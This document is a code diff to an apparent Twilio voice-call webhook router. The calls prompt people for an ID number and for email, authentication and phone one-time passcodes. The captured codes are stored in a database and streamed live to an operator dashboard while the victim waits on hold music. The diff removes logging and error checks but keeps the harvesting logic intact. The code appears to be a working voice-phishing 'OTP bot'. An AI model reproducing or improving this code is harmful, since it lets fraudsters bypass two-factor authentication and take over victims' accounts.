@@ -12,8 +12,6 @@ router.post('/voice-response/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Voice response - Session:', sessionId);
-    
     try {
         const session = await db.query(
             `SELECT cs.*, c.full_name FROM call_sessions cs 
@@ -33,8 +31,6 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         const fullName = callData.full_name;
         const subject = callData.subject;
         const customIntro = callData.custom_intro;
-        
-        console.log('Current action:', currentAction);
         
         if (currentAction === 'consent') {
             const gather = twiml.gather({
@@ -106,7 +102,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // USE TWILIO'S QUEUE WITH AUTOMATIC HOLD MUSIC
+            // USE YOUR EXISTING QUEUE - HOLD MUSIC WILL PLAY AUTOMATICALLY
             const enqueue = twiml.enqueue({
                 action: `/webhooks/leave-queue/${sessionId}`,
                 method: 'POST'
@@ -136,8 +132,6 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
-    
-    console.log('Consent - Session:', sessionId, 'Digits:', Digits);
     
     if (Digits === '1') {
         await db.query(
@@ -198,8 +192,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('ID Collected:', Digits);
-    
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         
@@ -239,37 +231,19 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Email OTP Collected:', Digits);
-    
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-        
-        if (session.rows.length === 0) {
-            twiml.say('Session not found. Goodbye.');
-            twiml.hangup();
-            return res.type('text/xml').send(twiml.toString());
-        }
-        
         const contactId = session.rows[0].contact_id;
-        
         await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
-        
         io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
-        
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
+        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
         enqueue.queue('hold_queue');
-        
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
     }
-    
     res.type('text/xml');
     res.send(twiml.toString());
 });
@@ -280,37 +254,19 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Auth OTP Collected:', Digits);
-    
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-        
-        if (session.rows.length === 0) {
-            twiml.say('Session not found. Goodbye.');
-            twiml.hangup();
-            return res.type('text/xml').send(twiml.toString());
-        }
-        
         const contactId = session.rows[0].contact_id;
-        
         await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
-        
         io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
-        
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
+        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
         enqueue.queue('hold_queue');
-        
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
     }
-    
     res.type('text/xml');
     res.send(twiml.toString());
 });
@@ -321,37 +277,19 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Phone OTP Collected:', Digits);
-    
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-        
-        if (session.rows.length === 0) {
-            twiml.say('Session not found. Goodbye.');
-            twiml.hangup();
-            return res.type('text/xml').send(twiml.toString());
-        }
-        
         const contactId = session.rows[0].contact_id;
-        
         await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
-        
         io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
-        
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
+        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
         enqueue.queue('hold_queue');
-        
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
     }
-    
     res.type('text/xml');
     res.send(twiml.toString());
 });
@@ -360,8 +298,6 @@ router.post('/call-status/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { CallStatus, Duration } = req.body;
     const io = req.app.get('io');
-    
-    console.log('Call Status:', CallStatus, 'Session:', sessionId);
     
     if (sessionId) {
         await db.query(
